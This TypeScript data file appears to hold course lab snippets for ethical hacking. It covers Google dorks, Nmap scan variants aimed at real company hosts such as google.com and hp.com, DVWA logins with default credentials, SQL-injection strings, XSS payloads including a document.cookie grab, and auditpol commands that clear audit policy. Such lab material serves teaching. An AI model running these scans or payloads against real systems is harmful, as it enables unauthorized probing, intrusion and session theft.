export interface SnippetSection {
  title: string;
  code: string;
}

export interface Snippet {
  id: string;
  title: string;
  description: string;
  language: string;
  code: string;
  sections?: SnippetSection[];
  tags: string[];
}

export const snippets: Snippet[] = [
  {
    id: "prac-1",
    title: "Prac 1: Footprinting (Google Dorks)",
    description: "Advanced search techniques for information gathering and reconnaissance using Google Search operators.",
    language: "markdown",
    tags: ["recon", "footprinting", "google-dorks", "information-gathering"],
    code: `# 01. Display Facebook page of ruia csit
inurl:facebook intext:ruia csit

# 02. Display python programs in PDF format from tutorialspoint
inurl:tutorialspoint intext:python filetype:pdf

# 03. Display the images related to covid-19
intitle:"covid-19" filetype: jpg

# 04. Display all video and audio files related to nasa
intext:"nasa" filetype: mp4 || mp3

# 05. Display today's weather of Poland
weather:Poland

# 06. Display financial budget of 2024-25 in excel format
filetype:xlsx financial budget 2024-25

# 07. Display the route from mumbai to goa
map:mumbai to goa

# 08. Find the white paper for bitcoin
intitle:Bitcoin filetype:pdf

# 09. Display the PM oath ceremony of 2024
intitle:PM oath ceremony

# 10. Display the ATKT timetable of Ruia College
site:ruiacollege.edu intext:ATKT timetable


Traceroute-
tracert google.com


`,


  },
  {
    id: "prac-2",
    title: "Prac 2: Network Scanning tools(NMAP)",
    description: "Specific Nmap commands for target scanning, port ranges, exclusion, and advanced scan types (SYN, ACK, FIN, NULL, XMAS).",
    language: "bash",
    tags: ["nmap", "scanning", "network-security"],
    code: `1) nmap www.google.com
2) nmap www.ruiacollege.edu

Q. scan the ports in specific range of target
1. nmap -p 1-100 www.google.com
2. nmap -p 1-100 aws.amazon.com

Q. scan a specific port on target machine
Command: nmap -p 80 www.google.com

Q. scan the ports by excluding the specific port
Command: nmap www.google.com --exclude-ports 1-100

ACK Scan = Command: nmap -sA -T4 nmap.org
SYN Scan = nmap -sS -T4 caldera.com
A FIN scan = nmap -sF -T4 acer.com
A NULL scan = nmap -sN -T4 hp.com
Q. XMAS Scan = nmap -sX -T4 hp.com`,
  },
  {
    id: "prac-3",
    title: "Prac 3: Enumeration tools NetBIOS",
    description: "NetBIOS enumeration and network statistics commands for identifying network resources.",
    language: "bash",
    tags: ["enumeration", "netbios", "network-security"],
    code: `IP Range: 192.168.2.1-192.168.2.254

# Note: Run the following command as Administrator
netstat -help`,
  },
  
  {
    id: "prac-5",
    title: "Prac 5: System Hacking (DVWA & Audit)",
    description: "System hacking techniques using DVWA for SQLi/XSS and AuditPol for system monitoring.",
    language: "bash",
    tags: ["system-hacking", "dvwa", "auditpol", "sqli", "xss"],
    code: `System Hacking & Monitoring`,
    sections: [
      {
        title: "DVWA (Login, SQLi, XSS)",
        code: ` LOGIN & SETUP 
URL: https://server.vulnapp.id/dvwa/login.php
Username: admin
Password: password
Security Level: Low (DVWA Security -> Low)

 SQL INJECTION 
1
1=a
1=1
1*
1' OR 1=1#
1' OR 1=True#
1@' OR True#

 XSS (STORED)
# Message 1:
<script>alert("your data is at risk")</script>

# Message 2:
<script>alert(document.baseURI);</script>

# Message 3:
</script><svg onload=alert('Danger')>

# Message 4:
<img src="x" onerror="alert('Danger')">

# Message 5:
<script>
  var newwindow = window.open('', '', 'height=800,width=800');
  newwindow.resizeTo(800, 800);
</script>

 XSS (REFLECTED)
# Payload 1:
<script>alert(document.cookie)</script>

# Payload 2:
<script>window.location = "https://www.w3schools.com/";</script>

# Payload 3:
<script>
  var ip = '192.168.2.49';
  document.write("IP address: " + ip);
</script>`,
      },
      {
        title: "Audit Pol",
        code: `(Run CMD as Administrator)
1. auditpol /get /category:*
2. auditpol /set /subcategory:"Logon" /success:enable /failure:enable
3. auditpol /get /category:*
4. auditpol /clear /y
5. auditpol /get /category:*`,
      },
    ],
  },
  

];
